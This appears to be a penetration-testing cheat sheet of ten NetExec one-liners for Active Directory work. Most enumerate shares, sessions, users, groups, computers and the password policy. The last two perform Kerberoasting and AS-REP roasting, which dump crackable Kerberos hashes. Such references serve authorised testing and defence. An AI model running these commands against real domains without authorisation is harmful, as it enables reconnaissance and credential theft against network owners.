# NetExec Module Discovery

Compact NetExec one-liners for common AD enumeration modules and protocol pivots.

<div class="ol-section-kicker"><span>AD</span><strong>10 one-liners</strong></div>

## List SMB modules

```bash
nxc smb -L
```

**Tool:** NetExec · **Platform:** Linux · **Tags:** AD, SMB, modules · **Context:** User · **Noise:** Moderate

## List LDAP modules

```bash
nxc ldap -L
```

**Tool:** NetExec · **Platform:** Linux · **Tags:** AD, LDAP, modules · **Context:** User · **Noise:** Moderate

## Enumerate shares

```bash
nxc smb <TARGETS> -u <USER> -p '<PASSWORD>' --shares
```

**Tool:** NetExec · **Platform:** Linux · **Tags:** AD, SMB, shares · **Context:** Domain user · **Noise:** Moderate

## Enumerate sessions

```bash
nxc smb <TARGETS> -u <USER> -p '<PASSWORD>' --sessions
```

**Tool:** NetExec · **Platform:** Linux · **Tags:** AD, SMB, sessions · **Context:** Domain user · **Noise:** Moderate

## Enumerate users

```bash
nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --users
```

**Tool:** NetExec · **Platform:** Linux · **Tags:** AD, LDAP, users · **Context:** Domain user · **Noise:** Moderate

## Enumerate groups

```bash
nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --groups
```

**Tool:** NetExec · **Platform:** Linux · **Tags:** AD, LDAP, groups · **Context:** Domain user · **Noise:** Moderate

## Enumerate computers

```bash
nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --computers
```

**Tool:** NetExec · **Platform:** Linux · **Tags:** AD, LDAP, computers · **Context:** Domain user · **Noise:** Moderate

## Password policy

```bash
nxc smb <DC_IP> -u <USER> -p '<PASSWORD>' --pass-pol
```

**Tool:** NetExec · **Platform:** Linux · **Tags:** AD, SMB, password policy · **Context:** Domain user · **Noise:** Moderate

## Kerberoast

```bash
nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --kerberoasting kerberoast.txt
```

**Tool:** NetExec · **Platform:** Linux · **Tags:** AD, Kerberos · **Context:** Domain user · **Noise:** Moderate

## AS-REP roast

```bash
nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --asreproast asrep.txt
```

**Tool:** NetExec · **Platform:** Linux · **Tags:** AD, Kerberos · **Context:** Domain user · **Noise:** Moderate

---

**Related:** Kerberos · Sessions · Tools: NetExec
